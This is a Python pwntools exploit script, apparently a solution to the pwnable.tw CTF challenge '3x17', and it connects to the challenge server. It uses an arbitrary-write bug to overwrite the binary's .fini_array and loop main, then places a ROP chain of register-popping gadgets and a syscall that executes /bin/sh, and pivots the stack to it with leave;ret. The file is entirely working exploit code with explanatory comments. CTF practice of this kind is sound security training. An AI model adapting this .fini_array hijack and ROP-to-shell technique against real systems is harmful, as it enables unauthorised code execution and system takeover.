#!/usr/bin/env python3

from pwn import *

exe = ELF("./3x17")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10105)

    return r


def write(addr: int, data: bytes):
    r.sendafter(b"addr:", str(addr).encode("ascii"))
    r.sendafter(b"data:", data)


def main():
    r = conn()

    rop = ROP(exe)

    pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
    pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0]
    syscall = rop.find_gadget(["syscall", "ret"])[0]
    leave   = rop.find_gadget(["leave", "ret"])[0]

    __call_fini_array = 0x402960
    _fini_array       = 0x4b40f0
    main              = 0x401b6d

    """
        0x401b84    movzx  eax, byte ptr [rip + 0xb77a5]
        0x401b8b    add    eax, 1
        0x401b8e    mov    byte ptr [rip + 0xb779c], al     <----- if $eax = 0x100 then $al = 0x00 (resets counter)
        0x401b94    movzx  eax, byte ptr [rip + 0xb7795]
        0x401b9b    cmp    al, 1
        0x401b9d    jne    0x401c35
    """

    # This will let us loop infinitely (see interaction above)
    write(_fini_array, p64(__call_fini_array) + p64(main))

    # Write the ROP chain near the .fini_array so we can "leave" to it and start poppin'
    write(_fini_array + 0x10, p64(pop_rdi) + p64(_fini_array + 0x58))
    write(_fini_array + 0x20, p64(pop_rsi) + p64(0x0))
    write(_fini_array + 0x30, p64(pop_rdx) + p64(0x0))
    write(_fini_array + 0x40, p64(pop_rax) + p64(0x3b))
    write(_fini_array + 0x50, p64(syscall) + b"/bin/sh\x00")

    # Exit from loop with a "leave; ret;" to fix the stack pointer so we can start popping the values.
    # The next "leave + 1 => ret" is for the next entry in the .fini_array since we will return to it.
    write(_fini_array, p64(leave) + p64(leave + 1))

    r.interactive("$ ")


if __name__ == "__main__":
    main()
